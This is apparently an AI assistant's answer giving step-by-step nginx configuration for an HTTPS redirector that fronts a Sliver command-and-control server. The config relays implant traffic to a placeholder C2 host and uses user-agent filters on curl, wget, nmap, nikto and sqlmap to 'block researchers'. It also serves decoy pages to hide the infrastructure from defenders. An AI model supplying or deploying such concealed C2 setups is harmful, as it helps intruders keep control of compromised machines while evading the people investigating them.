Nginx redirector for HTTPS is a solid choice. Here's the setup:

**On your redirector VPS:**

**Step 1: Install nginx**
```bash
apt update && apt install nginx -y
```

**Step 2: Configure reverse proxy**
```nginx
# /etc/nginx/sites-available/redirector
server {
    listen 443 ssl;
    server_name your-domain.com;

    ssl_certificate /etc/letsencrypt/live/your-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/your-domain.com/privkey.pem;

    # Only proxy Sliver C2 traffic
    location / {
        # Filter by user-agent or other headers
        if ($http_user_agent ~* "(curl|wget)") {
            return 404;
        }

        proxy_pass https://YOUR_C2_SERVER:443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

**Step 3: Add filtering (important!)**
Only allow implant traffic, block researchers:
```nginx
# Block known security scanners
if ($http_user_agent ~* "(nmap|nikto|sqlmap)") {
    return 404;
}

# Only allow specific URI patterns
location /api/ {
    proxy_pass https://C2_SERVER:443;
}

# Serve decoy content for everything else
location / {
    root /var/www/html;
    index index.html;
}
```

